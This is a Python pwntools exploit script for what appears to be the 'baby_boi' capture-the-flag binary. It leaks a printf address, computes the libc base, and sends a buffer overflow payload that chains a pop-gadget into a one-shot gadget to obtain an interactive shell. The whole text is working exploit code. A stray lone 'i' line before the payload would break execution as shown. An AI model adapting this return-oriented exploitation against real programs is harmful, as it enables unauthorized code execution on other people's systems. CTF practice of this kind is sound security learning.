#!/usr/bin/env python


from pwn import process,packing,ELF,gdb


prs = process("./baby_boi")


libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

print(prs.recvuntil("ere I am: "))
leak = prs.recvline()
leak = leak.strip()

base_libc = int(leak, 16) - libc.symbols['printf']
oneshot_gadget = base_libc + 0xcbd1d

"""0x000000000040078c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"""

i
payload = b'A' * 0x28 + packing.p64(0x000000000040078c) + packing.p64(0) + packing.p64(0) + packing.p64(0)+ \
          packing.p64(0) + packing.p64(oneshot_gadget)

prs.sendline(payload)
prs.interactive()


